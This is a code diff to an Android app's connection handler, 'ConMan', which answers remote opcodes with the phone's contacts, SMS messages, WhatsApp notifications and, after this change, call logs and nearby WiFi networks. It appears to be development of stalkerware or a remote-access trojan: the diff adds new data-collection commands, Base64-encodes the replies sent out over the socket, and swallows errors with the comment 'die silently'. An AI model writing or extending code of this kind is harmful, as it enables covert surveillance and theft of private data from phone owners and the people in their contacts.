@@ -2,6 +2,7 @@ package com.dextrotechnologies.phonemate;
 
 import android.os.Build;
 import android.provider.Settings;
+import android.util.Base64;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -48,9 +49,10 @@ public class ConMan {
                 String incomingMessage = in.readLine();
 
                 String message = performOps(incomingMessage);
-                int messageLength = message.getBytes(StandardCharsets.UTF_8).length;
+                String encodedMessage = Base64.encodeToString(message.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);
+                int messageLength = encodedMessage.getBytes(StandardCharsets.UTF_8).length;
 
-                out.write(message, 0, messageLength);
+                out.write(encodedMessage, 0, messageLength);
                 out.flush();
             } catch (Exception e) {
                 // die silently
@@ -83,6 +85,10 @@ public class ConMan {
             case "0xC0":
                 returnMessage = String.valueOf(ContactsMan.getContacts());
                 break;
+            // Call Logs
+            case "0xC1":
+                returnMessage = String.valueOf(CallMan.getCallsLogs());
+                break;
             // SMS Recv
             case "0xS0":
                 returnMessage = String.valueOf(SmsMan.GetSms());
@@ -94,6 +100,10 @@ public class ConMan {
             // Whatsapp Notification
             case "0xWA":
                 returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
+                break;
+            // Wifi Scanner
+            case "0xWI":
+                returnMessage = String.valueOf(WifiScanner.scan(MainService.getContextOfApplication()));
                 break;
             default:
                 returnMessage = "Invalid";
